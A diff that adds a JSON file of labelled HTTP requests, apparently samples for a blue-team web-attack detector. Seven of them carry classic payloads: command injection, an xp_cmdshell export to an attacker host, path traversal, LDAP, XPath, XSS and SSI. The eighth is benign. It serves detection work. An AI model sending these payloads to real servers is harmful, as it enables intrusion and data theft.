@@ -1,0 +1,38 @@
+{
+  "source_dataset": "/root/Blueteam/data/final_clean_small_plus_cmdi.csv",
+  "selection_note": "Easy examples: explicit canonical patterns, easy to identify by eye. 1 per attack type plus benign.",
+  "requests": [
+    {
+      "attack_type": "Command Injection",
+      "raw_request": "GET /search?search=$(`whoami`) HTTP/1.1\r\nHost: demo.local\r\nUser-Agent: curl/8.0.1\r\nAccept: */*\r\nConnection: close"
+    },
+    {
+      "attack_type": "SQLi",
+      "raw_request": "GET /UM/6Erl1vOZ7WFFe0/gq5_9/ee2piws9aoheoeh/jesmutilatLee3tSe3i/1eeeuAseoRvy/iOf/lHhiSbqfmz@FJ7/2nmmt6rt0c/o2-UrHO9Fyus/irhc4omBo.bin?bOrue=jG.DlcW&jjTT8nSxo=195&h5fa=nmi4gtes&5W@CQNElLPU=09425049&3oturcfoiaeEcnn=ne9no7ircpb&1iaabisanny=homehoog&wrltu=03529584&iInttI7lho=ROnonk&nuenobodg7osct4=2169653868&bmrpositionZ9IFt4iframe=898636842&ibkVOJb8xJcmd=prjsAIKmIeid HTTP/1.1\r\nHost: 182.158.56.185\r\nConnection: close\r\nAccept-Charset: iso-8859-6;q=0.9, macintosh;q=0.6, windows-1250\r\nAccept-Language: exec     xp_cmdshell 'bcp \"select     *    from hlsehywt\"   queryout     pwdump.exe -c  -Craw  -Shackersip    -Usa  -Ph8ck3r'\r\nClient-ip: 112.163.2.243\r\nIf-Modified-Since: Tue, 17 Jun 08 06:54:17 GMT\r\nIf-Unmodified-Since: Thu, 12 Jun 08 03:37:08 GMT\r\nIf-None-Match: \"bNezi4pbJPl49-Xl\"\r\nMax-Forwards: 4\r\nPragma: f9tlse='mrmtti86'\r\nAuthorization: irOaes stfee=o06E\r\nReferer: /asulsrso/aedo/eirrs/lweioaLe.php\r\nUser-Agent: r1H.nHL http://www.farhf.de\r\nVia: 5.6 12.155.94.10"
+    },
+    {
+      "attack_type": "Path Traversal",
+      "raw_request": "GET /profile?q=/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\boot.ini HTTP/1.1\r\nHost: app.local\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close"
+    },
+    {
+      "attack_type": "LDAP Injection",
+      "raw_request": "GET /auth?redirect=query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)) HTTP/1.1\r\nHost: demo.local\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close"
+    },
+    {
+      "attack_type": "XPath Injection",
+      "raw_request": "GET /BxmIH/dfnEiye/trtjcEsrioA0/nnuuHwaiStr6e/s.ORG-RlZcp2_/ttttodilwioeecon8o6i/izxI/uaeooitwtsedyiae/uolFZpp/ge8hdsejtiaf.swf?nnLyteseys8dptc=favc%3Cdi&wNngrU67=n%40Ree4teueea&ioznwtnsie=p0apbesEikvoiopi&ne=oe8-a&tdp=e0-&yiulodw=rj97anoaew&i4c=%3Aop%3Dl+%7CTngevalpanT&baeee1rtibei=s+dno+&ftlt1smdte4hee=nEBmk&tttererOesi=H3sGsve&Fx8usr1mw=097090&UHA=oraoT HTTP/1.0\r\nHost: www.A64m6tn.net\r\nConnection: close\r\nAccept: video/mpeg;q=0.3, application/*\r\nAccept-Charset: windows-1257, windows-1254;q=0.7, big5;q=0.7\r\nAccept-Encoding: *;q=0.7\r\nAccept-Language: oo-nya, h-hbey5u, h8wh-qwee6sth;q=0.3\r\nCookie: dnyurib=a/h/inuho8/child::node()[  position()=78] |   iur/ees/nesoiz/child::text()[position()=556]     or 'tmn'   ='\r\nDate: Mon, 26 Dec 05 13:21:49 UTC\r\nIf-Match: \"BSWOns@@KCf-ZI1\"\r\nPragma: f=nsuuNl3a\r\nReferer: http://5D5weoc.uk/e6rntte5.php4\r\nUser-Agent: RnteieNore/5.7.2\r\nUA-OS: FreeBSD"
+    },
+    {
+      "attack_type": "XSS",
+      "raw_request": "GET /auth?file=\"'><img src=xxx:x \\x20onerror=javascript:alert(1)> HTTP/1.1\r\nHost: app.local\r\nUser-Agent: python-requests/2.31\r\nAccept: */*\r\nConnection: close"
+    },
+    {
+      "attack_type": "SSI",
+      "raw_request": "GET /rWCRvX42xZ/U4uynizi/53jBr78tz9tutGiCQqpI/hG9o1y@aq5vdr-4/g.B7.sh?1skohhoshbol=aetrcis&vnOaV8lLNOr=xtyaZH HTTP/1.1\r\nHost: 193.223.175.196:8906\r\nConnection: keep-alive\r\nAccept: audio/*;q=0.2, text/*\r\nAccept-Charset: *;q=0.3\r\nAccept-Language: <!--     #include   virtual=\"/etc/httpd/httpd.conf\" -->\r\nDate: Sat, 14 Oct 06 08:24:15 UTC\r\nETag: W/\"y_v@qo@HC_yU4W81g_a3\"\r\nExpect: 100-continue\r\nIf-Match: *\r\nMax-Forwards: 1559\r\nAuthorization: NTLM aWVlZGVobmNzYTMzYWhtaWhMZFlnTW9lb2Vvc2lybXJlb05IZQ==\r\nReferer: /gcbs.swf\r\nUser-Agent: Mozilla/9.8 (Machintosh; U; Mac OS X 3.1; tr-ss; rv:1.5.1) Gecko/59388408\r\nUA-OS: Linux\r\nTransfer-Encoding: compress"
+    },
+    {
+      "attack_type": "benign",
+      "raw_request": "GET /rt/oLu3Pwp-uD/tnuveieA1td/edieodJsnaayvtsgh/glTbQ/oqT@G./lou9a/omUq/9trIedf4eietqiIed.png?hlgEof6Rlfa5=v&teDolteuhsCee=mM34-%408x&ntenEbo0=a4aouwhcc0uhjo&cmsbwaHwoy8=8537772&YQr@RCc8tJ=4eRE46tsso&ddiR3nnr6x=scs2t&tD5ierircd=019034&XOnodeevalnechoLWe=aiooonbh&qra=ianxw3yovku&divViV-var=1&8easwod=tsnenolnif3nst&eawnpeaEea=wD5ie.Ce7eNj&Sra1baoa4htAV=10088713 HTTP/1.1\r\nHost: 6.81.36.189:13955\r\nConnection: close\r\nAccept-Charset: hz-gb-2312;q=0.8, windows-1252;q=0.7, euc-cn;q=0.3, cp-936, windows-1251\r\nAccept-Encoding: gzip, identity;q=0.2, gzip\r\nAccept-Language: oed6esb-ste1tni, fcUwu5-a, E-er, qokl-met;q=0.1\r\nCache-Control: only-if-cached\r\nCookie: 9ooincgft2muEl9=fuLiGhyste\r\nCookie2: $Version=\"156\"\r\nETag: W/\"1rGlZI2_N_SUdCE-Yj8\"\r\nFrom: n9mf@hcs9solg.ch\r\nIf-Range: *\r\nMax-Forwards: 17\r\nProxy-Authorization: tyho a4sceAie=eeAlad\r\nReferer: /ntoogD/rehis.jpg\r\nUser-Agent: Mozilla/5.5 (Windows; U; WinNT 3.1; g2-o5; rv:7.7.6) Gecko/92694168"
+    }
+  ]
+}
